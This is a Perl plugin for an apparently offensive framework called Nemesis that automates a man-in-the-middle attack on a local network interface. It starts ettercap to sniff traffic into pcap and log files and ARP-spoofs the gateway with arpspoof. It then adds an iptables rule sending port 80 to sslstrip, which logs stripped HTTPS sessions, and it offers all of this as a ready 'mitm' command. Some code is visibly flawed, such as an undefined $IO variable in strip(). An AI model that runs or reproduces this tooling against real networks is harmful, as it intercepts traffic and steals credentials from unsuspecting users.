package Plugin::Sniffer;
use warnings;
use Carp qw( croak );
use Nemesis::Process;
use Nemesis::Session;
my $VERSION = '0.1a';
my $AUTHOR  = "mudler";
my $MODULE  = "Sniffer Module";
my $INFO    = "<www.dark-lab.net>";

#Public exported functions
my @PUBLIC_FUNCTIONS =
	qw(configure check_installation status where stop sniff spoof strip mitm)
	;    #NECESSARY

sub new
{        #NECESSARY
	 #Usually new(), export_public_methods() and help() can be copyed from other plugins
	my $package = shift;
	bless( {}, $package );
	my (%Obj) = @_;
	%{ $package->{'core'} } = %Obj;

	#Here goes the required parameters to be passed
	croak("IO and environment must be defined\n")
		if (    !defined( $package->{'core'}->{'IO'} )
			 || !defined( $package->{'core'}->{'env'} )
			 || !defined( $package->{'core'}->{'interfaces'} ) );

#$package->{'Session'} = $package->{'core'}->{'ModuleLoader'}->loadmodule("Session");
#$package->{'Session'}->initialize($MODULE);
	return $package;
}

sub export_public_methods()
{    #NECESSARY
	my $self = shift;
	return @PUBLIC_FUNCTIONS;
}

sub help()
{    #NECESSARY
	my $self    = shift;
	my $IO      = $self->{'core'}->{'IO'};
	my $section = $_[0];
	$IO->print_title( $MODULE . " Helper" );
	if ( $section eq "configure" || $section eq "check_installation" )
	{
		$IO->print_info("nothing to configure here");
	} elsif ( $section eq "status" )
	{
		$IO->print_info("syntax: status [dev]");
		$IO->print_info("effect: Output the status of the devices");
		$IO->print_tabbed("where [dev] is optional and can be an interface");
	} elsif ( $section eq "stop" )
	{
		$IO->print_info("syntax: stop (dev) [stripper|spoofer|sniffer]");
		$IO->print_info("effect: stop the processes running on the device");
		$IO->print_tabbed("where (dev) is required and can be an interface");
		$IO->print_tabbed(
			"where [stripper|spoofer|sniffer] is optional and it's the type of process to stop"
		);
	} elsif (    $section eq "sniff"
			  || $section eq "spoof"
			  || $section eq "strip" )
	{
		$IO->print_info("syntax: $section (dev)");
		$IO->print_info("effect: $section on the device");
		$IO->print_tabbed("where (dev) is required and can be an interface");
	} elsif ( $section eq "mitm" )
	{
		$IO->print_info("syntax: $section (dev)");
		$IO->print_info("effect: $section on the device");
		$IO->print_tabbed("where (dev) is required and can be an interface");
	}
}

sub clear
{    #NECESSARY - CALLED ON EXIT
	my $self = shift();
	my $IO   = $self->{'core'}->{'IO'};
	foreach my $dev ( keys %{ $self->{'process'} } )
	{
		foreach my $type ( keys %{ $self->{'process'}->{$dev} } )
		{
			$self->{'process'}->{$dev}->{$type}->destroy();
			delete $self->{'process'}->{$dev}->{$type};
		}
	}
}

sub mitm
{
	my $self       = shift;
	my $IO         = $self->{'core'}->{'IO'};
	my $env        = $self->{'core'}->{'env'};
	my $interfaces = $self->{'core'}->{'interfaces'};
	my $dev        = $_[0];
	$IO->print_title("Mitm - Man in the middle on $dev");
	$self->sniff($dev);
	$self->spoof($dev);
	$self->strip($dev);
	$self->status($dev);
}

sub sniff
{

	#
	#  name:	sniff
	#  @param	interface
	#  @return	nothing
	#
	#
	#
	#
	my $self       = shift;
	my $IO         = $self->{'core'}->{'IO'};
	my $env        = $self->{'core'}->{'env'};
	my $Session    = $self->{'core'}->{'Session'};
	my $interfaces = $self->{'core'}->{'interfaces'};
	my $code;
	my $dev = $_[0];
	my $pcap_file =
		$Session->new_file( $dev . "-ettercap-" . $env->time() . ".pcap" );
	my $log_file = $Session->new_file( $dev . "-etterlog-" . $env->time() );
	$code =
		  'ettercap -Du -i ' 
		. $dev . ' -L '
		. $log_file . ' -w '
		. $pcap_file
		. " -P autoadd";
	my $Process = $self->{'core'}->{'ModuleLoader'}->loadmodule("Process");
	$Process->set( type => 'daemon',    # forked pipeline
				   code => $code );
	if ( $Process->start() )
	{
		$self->{'process'}->{$dev}->{'sniffer'} = $Process;
		$IO->process_status($Process);
	} else
	{
		$IO->print_alert(
					  "Process cannot be executed, maybe lack of permissions?");
	}
}

sub spoof
{

	#
	#  name:	spoof
	#  @param	interface
	#  @return	nothing
	#
	my $self       = shift;
	my $IO         = $self->{'core'}->{'IO'};
	my $env        = $self->{'core'}->{'env'};
	my $interfaces = $self->{'core'}->{'interfaces'};
	my $Session    = $self->{'core'}->{'Session'};
	my $dev        = $_[0];
	my $forwarded  = $env->ipv4_forward("on");
	$IO->print_info( "IPV4_FORWARD : " . $forwarded );
	$IO->print_info( "Detected gateway : " . $interfaces->{'GATEWAY'} );
	my $code    = 'arpspoof -i ' . $dev . " " . $interfaces->{'GATEWAY'};
	my $Process = $self->{'core'}->{'ModuleLoader'}->loadmodule("Process");
	$Process->set( type => 'system',                   # forked pipeline
				   code => $code,
				   env  => $self->{'core'}->{'env'},
				   IO   => $IO
	);
	$Process->start() or croak("Can't start the process");
	$self->{'process'}->{$dev}->{'spoofer'} = $Process;
	$IO->process_status($Process);
}

sub strip
{
	my $self    = shift;
	my $output  = $self->{'core'}->{'IO'};
	my $env     = $self->{'core'}->{'env'};
	my $dev     = $_[0];
	my $Session = $self->{'core'}->{'Session'};
	$output->print_info("Setting iptables to redirect to sslstrip port..");
	$output->exec(
		"iptables -t nat -A PREROUTING -p tcp -i $dev --destination-port 80 -j REDIRECT --to-port 8080"
	);
	my $strip_file =
		$Session->new_file( $dev . "-sslstrip-" . $env->time() . ".log" );
	my $code    = 'sslstrip -l 8080 -a -k -f -w ' . $strip_file;
	my $Process = $self->{'core'}->{'ModuleLoader'}->loadmodule("Process");
	$Process->set( type => 'system',                   # forked pipeline
				   code => $code,
				   env  => $self->{'core'}->{'env'},
				   IO   => $output,
				   file => $strip_file
	);
	$Process->start() or croak("Can't start the process");
	$self->{'process'}->{$dev}->{'stripper'} = $Process;
	$IO->process_status($Process);
}

sub status
{
	my $self   = shift;
	my $output = $self->{'core'}->{'IO'};
	my $env    = $self->{'core'}->{'env'};
	my $process;
	if ( $_[0] )
	{
		$output->print_title("Status of process up for $_[0]");
		$self->status_device( $_[0] );
	} else
	{
		foreach my $dev ( keys %{ $self->{'process'} } )
		{
			$self->status_device($dev);
		}
	}
}

sub status_device()
{
	my $self    = shift;
	my $dev     = $_[0];
	my $output  = $self->{'core'}->{'IO'};
	my $env     = $self->{'core'}->{'env'};
	my $Session = $self->{'core'}->{'Session'};
	foreach my $type ( keys %{ $self->{'process'}->{$dev} } )
	{
		$output->process_status( $self->{'process'}->{$dev}->{$type} );
	}
}

sub stop
{
	my $self   = shift;
	my $output = $self->{'core'}->{'IO'};
	my $env    = $self->{'core'}->{'env'};
	my $dev    = $_[0];
	my $group  = $_[1];
	if ( !defined($dev) )
	{
		$output->print_alert("You must provide at least a device");
	} else
	{
		if ( defined($group) )
		{
			$output->print_info(
						 "Stopping all activities on " . $dev . " for $group" );
			my $process = $self->{'process'}->{$dev}->{$group};
			$process->destroy();
			delete $self->{'process'}->{$dev}->{$group};
		} else
		{
			foreach my $group ( keys %{ $self->{'process'}->{$dev} } )
			{
				$output->print_title( "Stopping $group on " . $dev . "" );
				$self->{'process'}->{$dev}->{$group}->destroy();
				delete $self->{'process'}->{$dev}->{$group};
			}
		}
		$output->exec("iptables -t nat -F");
	}
}

sub where
{
	my $self   = shift;
	my $output = $self->{'core'}->{'IO'};
	my $env    = $self->{'core'}->{'env'};
	my $path   = $env->whereis( $_[0] );
	$output->print_info( $_[0] . " bin is at $path" );
}

sub info
{
	my $self = shift;
	my $IO   = $self->{'core'}->{'IO'};
	my $env  = $self->{'core'}->{'env'};
	$IO->print_tabbed("$MODULE v$VERSION ~ $AUTHOR ~ $INFO");
}

sub check_installation
{
	my $self      = shift;
	my $env       = $self->{'core'}->{'env'};
	my $IO        = $self->{'core'}->{'IO'};
	my $workspace = $env->workspace();
	$IO->print_info( "Workspace: " . $workspace );
}
1;
__END__
